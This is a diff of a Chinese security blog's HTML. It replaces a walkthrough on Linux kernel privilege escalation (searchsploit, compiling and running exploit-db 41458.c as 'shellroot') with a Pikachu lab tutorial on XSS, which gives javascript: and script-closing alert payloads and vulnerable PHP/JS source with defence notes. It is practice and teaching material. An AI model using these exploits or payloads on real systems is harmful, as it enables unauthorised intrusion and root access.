+<p>可以使用<code>JavaScript</code>协议来执行js代码</p>
+</li>
+<li><p>操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(123)</span><br></pre></td></tr></table></figure>
 
-<h3 id="步骤四：提升权限"><a href="#步骤四：提升权限" class="headerlink" title="步骤四：提升权限"></a>步骤四：提升权限</h3><h4 id="①查询内核版本漏洞"><a href="#①查询内核版本漏洞" class="headerlink" title="①查询内核版本漏洞"></a>①查询内核版本漏洞</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit ubuntu 4.4.0</span><br></pre></td></tr></table></figure>
+<p>经操作发现, 这个方法只能弹出数字, 字母无法弹出</p>
+</li>
+<li><p>源码分析</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&apos;submit&apos;]))&#123;</span><br><span class="line">    if(empty($_GET[&apos;message&apos;]))&#123;</span><br><span class="line">        $html.=&quot;&lt;p class=&apos;notice&apos;&gt;叫你输入个url,你咋不听?&lt;/p&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    if($_GET[&apos;message&apos;] == &apos;www.baidu.com&apos;)&#123;</span><br><span class="line">        $html.=&quot;&lt;p class=&apos;notice&apos;&gt;我靠,我真想不到你是这样的一个人&lt;/p&gt;&quot;;</span><br><span class="line">    &#125;else &#123;</span><br><span class="line">        //输出在a标签的href属性里面,可以使用javascript协议来执行js</span><br><span class="line">        //防御:只允许http,https,其次在进行htmlspecialchars处理</span><br><span class="line">        $message=htmlspecialchars($_GET[&apos;message&apos;],ENT_QUOTES);</span><br><span class="line">        $html.=&quot;&lt;a href=&apos;&#123;$message&#125;&apos;&gt; 阁下自己输入的url还请自己点一下吧&lt;/a&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2019/09/16/内核提权/4.png" alt="4"></p>
-<p>查看漏洞文件内容</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/share/exploitdb/eploits/linux/local/41458.c</span><br><span class="line">cp 41458.c /root/Desktop/</span><br><span class="line">cd /root/Desktop/</span><br></pre></td></tr></table></figure>
 
-<h4 id="②编译漏洞代码"><a href="#②编译漏洞代码" class="headerlink" title="②编译漏洞代码"></a>②编译漏洞代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc 41458.c -o shellroot</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2019/09/16/内核提权/5.png" alt="5"></p>
-<h4 id="③上传缓存溢出程序"><a href="#③上传缓存溢出程序" class="headerlink" title="③上传缓存溢出程序"></a>③上传缓存溢出程序</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">upload /root/Desktop/shellroot</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2019/09/16/内核提权/6.png" alt="6"></p>
-<h4 id="④赋予“缓存溢出程序”权限"><a href="#④赋予“缓存溢出程序”权限" class="headerlink" title="④赋予“缓存溢出程序”权限"></a>④赋予“缓存溢出程序”权限</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">chmod 777 shellroot</span><br><span class="line">./shellroot</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2019/09/16/内核提权/7.png" alt="7"></p>
-<p><img src="/2019/09/16/内核提权/8.png" alt="8"></p>
+</li>
+</ul>
+<h3 id="0X0A-XSS之js输出"><a href="#0X0A-XSS之js输出" class="headerlink" title="0X0A XSS之js输出"></a>0X0A XSS之js输出</h3><ul>
+<li><p>思路</p>
+<p>输入a, 右键查看源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    $ms=&apos;asd&apos;;</span><br><span class="line">    if($ms.length != 0)&#123;</span><br><span class="line">        if($ms == &apos;tmac&apos;)&#123;</span><br><span class="line">            $(&apos;#fromjs&apos;).text(&apos;tmac确实厉害,看那小眼神..&apos;)</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">//            alert($ms);</span><br><span class="line">            $(&apos;#fromjs&apos;).text(&apos;无论如何不要放弃心中所爱..&apos;)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>发现, 输入的内容直接复制给了变量<code>$ms</code>, 没有任何处理, 而且还是在<code>&lt;script&gt;</code>标签内, 所以,直接构造闭合</p>
+</li>
+<li><p>操作</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&apos;&lt;/script&gt;&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>源码分析</p>
+<p>源码分析如, 思路所示, 在网页中直接可以看到 </p>
+<p>注意一下几点</p>
+<ul>
+<li>javascript里面是不会对tag和字符实体进行解释的,所以需要进行js转义</li>
+<li>在JS的输出点应该使用\对特殊字符进行转义</li>
+</ul>
+</li>
+</ul>
 
       
 
@@ -272,7 +438,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">CTF靶机系列</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">Pikachu靶机系列</a>
         		</li>
       		
 		</ul>
@@ -328,7 +494,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http:/2019/09/16/内核提权/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http:/2020/02/18/XSS漏洞手工测试/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -342,18 +508,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2019/09/17/SQL注入-Cookie注入/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          SQL注入-Cookie注入
-        
-      </div>
-    </a>
   
-  
-    <a href="/2019/09/16/综合测试/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">综合测试</div>
+    <a href="/2020/02/17/XSS联系/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">XSS漏洞练习与正则练习</div>
       <i class="icon-circle-right"></i>
     </a>
   
